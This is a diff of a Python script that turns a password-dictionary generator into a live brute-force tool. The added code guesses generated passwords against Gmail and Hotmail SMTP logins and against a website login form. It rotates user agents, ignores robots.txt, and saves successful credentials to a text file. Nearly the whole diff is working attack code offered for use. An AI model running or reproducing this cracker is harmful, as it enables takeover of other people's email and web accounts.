@@ -1,5 +1,114 @@
 #!/usr/bin/python3
-import sys, os, readline
+import sys, os, readline, mechanize, random, time, smtplib
+def email(email):
+	check=False
+	lista=[]
+	if email.count("@")==1:
+		lista=email.split("@")
+		if lista[0].find("@")!=-1 or lista[0].find("\\")!=-1 or lista[0].find("º")!=-1 or lista[0].find("ª")!=-1 or lista[0].find("!")!=-1 or lista[0].find("\"")!=-1 or lista[0].find("·")!=-1 or lista[0].find("$")!=-1 or lista[0].find("%")!=-1 or lista[0].find("/")!=-1 or lista[0].find("(")!=-1 or lista[0].find(")")!=-1 or lista[0].find("=")!=-1 or lista[0].find("?")!=-1 or lista[0].find("¿")!=-1 or lista[0].find("'")!=-1 or lista[0].find("¡")!=-1 or lista[0].find("`")!=-1 or lista[0].find("\'")!=-1 or lista[0].find("+")!=-1 or lista[0].find("|")!=-1 or lista[0].find("#")!=-1 or lista[0].find("~")!=-1 or lista[0].find("½")!=-1 or lista[0].find("¬")!=-1 or lista[0].find("{")!=-1 or lista[0].find("[")!=-1 or lista[0].find("]")!=-1 or lista[0].find("}")!=-1 or lista[0].find("-")!=-1 or lista[0].find("_")!=-1 or lista[0].find(":")!=-1 or lista[0].find(";")!=-1 or lista[0].find(",")!=-1 or lista[0].find("&")!=-1 or lista[0].find("€")!=-1:
+			check=False
+		else:
+			check=True
+			if str(lista[1]).count(".")==1:
+				pass
+			else:
+				check=False
+	else:
+		check=False
+	return check
+def attack_live(service,server,port,email,password,username):
+	if service=="email":
+		try:
+			smtp=smtplib.SMTP(server,port)
+			smtp.ehlo()
+			smtp.starttls()
+			password=password.replace("\n","")
+			smtp.login(email,password)
+			print("\033[1;32m[+]\033[0m user:"+str(email)+" password:"+str(password))
+			f=open("passwords_emails.txt","a")
+			if server=="smtp.live.com":
+				server_title="HOTMAIL"
+			elif sever=="smtp.gmail.com":
+				server_title="GMAIL"
+			f.write(str(server_title)+" ==>>  user: "+str(email)+" password: "+str(password))
+			f.close()
+			smtp.quit()
+		except smtplib.SMTPAuthenticationError:
+			print("\033[1;31m[-]\033[0m not found: "+str(password)+" email: "+str(email))
+		except smtplib.SMTPServerDisconnected:
+			print("\033[1;31m [!]\033[0m Disconnect")
+			sys.exc_info()
+		except KeyboardInterrupt:
+			print("Oh! What happened? :O")
+			sys.exit()
+	elif service=="website":
+		try:
+			browser=mechanize.Browser()
+			browser.set_handle_robots(False) #not handle robots
+			useragents=[
+				'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)',
+				'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
+				'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
+				'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6'
+			]
+			browser.addheaders=[('User-Agent',random.choice(useragents))] # client type random
+			website=browser.open("http://website.com/login")
+			browser.select_form(predicate=lambda frm: 'id' in frm.attrs and frm.attrs['id'] == 'form_id')
+			browser.form["signin-form[login]"]=username
+			browser.form["signin-form[password]"]=password
+			browser.method="POST"
+			submit=browser.submit()
+			text=str(submit.read())
+			# if the Page source has the string 'dashboard', this means that, it was logged successfully.
+			if text.count("dashboard")>0:
+				print("\033[1;32m[+]\033[0m user:"+str(username)+" password:"+str(password))
+				f=open("password_website","a")
+				f.write(str(server_name)+" ==>> "+"username: "+str(username)+" password: "+str(password))
+				f.close()
+				sys.exit()
+			else:
+				print("\033[1;31m[-]\033[0m not found: "+str(password)+" username: "+str(username))
+				time.sleep(5)
+			f=open("error","w")
+			f.write(text)
+			f.close
+		except:
+			print("\033[1;31m[!] WARNING!\033[0m Fatal error in the login")
+			print(sys.exc_info())
+def generate_live_passwords(min,max,dic,pattern):
+	n=1
+	code=""
+	# Prints the range
+	for num in range(min,(max+1)):
+		lista=[]
+		tab_n=1 #tabulations' number
+		# For each number printed in the previous loop for, it does other loop for
+		for i in range(1,(num+1)):
+			# If the variable's number is the last
+			if i==(num+1):
+				lista.append("L"+str(n))
+				code+="for L"+str(n)+" in dic:\n"
+			else:
+				lista.append("L"+str(n))
+				code+="for L"+str(n)+" in dic:\n"
+				#Print as many tabs as variable's value 'tab_n'
+				for tab in range(1,(tab_n+1)):
+					code+="\t"
+				tab_n+=1
+				n+=1
+		passwords=""
+		#This creates a mathematical operation, with the 'item' variables. For generate the passwords
+		for item in lista:
+			passwords+=str(item)+"+"
+		leng=len(passwords)
+		passwords=passwords[:leng -1]
+		# if the 'pattern' option is true, the passwords are generated with the pattern specified.
+		if pattern==True:
+			code+="password="+str(passwords)+"; password=p[0]+password+p[1];attack_live(service,server_live,port_live,email_live_input,password,username)"
+		else:
+			code+="password="+str(passwords)+"; attack_live(service,server_live,port_live,email_live_input,password,username)"
+		code+="\n"
+	return code
 def generate_passwords(length_min,length_max,dic,boolean,pattern):
 	n=1
 	code=""
@@ -113,27 +222,64 @@ _/\_                              /
 #
 # KEEP DICTIONARY FILE
 #
-	output=input("Do you want to Keep dictionary file? [y/n] ")
+	live=input("Do you want to attack while the script generates the passwords? [y/n] ")
 	pathfile=None
-	if output=="y" or output=="Y":
-		output=True
-		output_input=False
-		while output_input==False:
-			pathfile=str(input("path: "))
-			if pathfile=="" or pathfile==' ':
-                                print("\033[1;31m[-]\033[0m Empty")
-                                output_input=False
-			elif os.path.isfile(str(pathfile)):
-				print("\033[1;31m[-]\033[0m This file exists")
-				output_input=False
-			else:
-				output_input=True
+	if live=="Y" or live=="y":
+		print("""
+	●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+		1) GMAIL
+		2) HOTMAIL
+		3) website
+	●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+		""")
+		username=""
+		service=""
+		server_live=""
+		port_live=0
+		email_live_input=""
+		live_choose=int(input("choose: "))
+		if live_choose==1 or live_choose==2:
+			if live_choose==1:
+				service="email"
+				server_live="smtp.gmail.com"
+			elif live_choose==2:
+				service="email"
+				server_live="smtp.live.com"
+			port_live=587
+			boolean_email=False
+			while boolean_email==False:
+				email_live_input=str(input("email: "))
+				email_live=email(email_live_input)
+				if email_live==False:
+					print("\033[1;31m[-]\033[0m Invalid email")
+				elif email_live==True:
+					boolean_email=True
+		elif live_choose==3:
+			service="website"
+			username=str(input("username: "))
+		else:
+			print("\033[1;34m[i]\033[0m Cancelled")
 	else:
-		output=False
-		print("\033[1;31m[!] Warning:\033[0m If you don't save the passwords generated, it will keep in a variable, and it can dead this process, while this is generated (if it generate a lot of passwords)")
-		cancel=str(input("Cancel? [y/n]: "))
-		if cancel=="Y" or cancel=="y":
-			os.system("./dictionary")
+		output=input("Do you want to Keep dictionary file? [y/n] ")
+		if output=="y" or output=="Y":
+			output=True
+			output_input=False
+			while output_input==False:
+				pathfile=str(input("path: "))
+				if pathfile=="" or pathfile==' ':
+	                                print("\033[1;31m[-]\033[0m Empty")
+	                                output_input=False
+				elif os.path.isfile(str(pathfile)):
+					print("\033[1;31m[-]\033[0m This file exists")
+					output_input=False
+				else:
+					output_input=True
+		else:
+			output=False
+			print("\033[1;31m[!] Warning:\033[0m If you don't save the passwords generated, it will keep in a variable, and it can dead this process, while this is generated (if it generate a lot of passwords)")
+			cancel=str(input("Cancel? [y/n]: "))
+			if cancel=="Y" or cancel=="y":
+				os.system("./dictionary")
 	characters=[
 		["0","1","2","3","4","5","6","7","8","9"],
 		["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"],
@@ -195,20 +341,24 @@ _/\_                              /
 	else:
 		string=""
 	#This create a file (empty) in the PC's location specified
-	if output==True:
-		string+="dic="+str(dic)+"\npasswords=open(\'"+str(pathfile)+"\','w')\n"
-		if pattern==True:
-			string+=generate_passwords(min,max,dic,True,True)
-		elif pattern==False:
-			string+=generate_passwords(min,max,dic,True,False)
-		string+="passwords.close()"
-	#This create a list (empty), if the option is false
-	elif output==False:
-		string+="dic="+str(dic)+"\npasswords=[]\n"
-		if pattern==True:
-                	string+=generate_passwords(min,max,dic,False,True)
-		elif pattern==False:
-                	string+=generate_passwords(min,max,dic,False,False)
+	if live=="y" or live=="Y":
+		string+="dic="+str(dic)+"\n"
+		string+=generate_live_passwords(min,max,dic,pattern)
+	else:
+		if output==True:
+			string+="dic="+str(dic)+"\npasswords=open(\'"+str(pathfile)+"\','w')\n"
+			if pattern==True:
+				string+=generate_passwords(min,max,dic,True,True)
+			elif pattern==False:
+				string+=generate_passwords(min,max,dic,True,False)
+			string+="passwords.close()"
+		#This create a list (empty), if the option is false
+		elif output==False:
+			string+="dic="+str(dic)+"\npasswords=[]\n"
+			if pattern==True:
+	                	string+=generate_passwords(min,max,dic,False,True)
+			elif pattern==False:
+	                	string+=generate_passwords(min,max,dic,False,False)
 	exec(str(string))
 	print("\033[1;32m[+]\033[0m Passwords generated successfully") # Finish passwords generated
 	# After, this asks if you want continue or exit. If continue, it execute 'attack' script with the dictionary
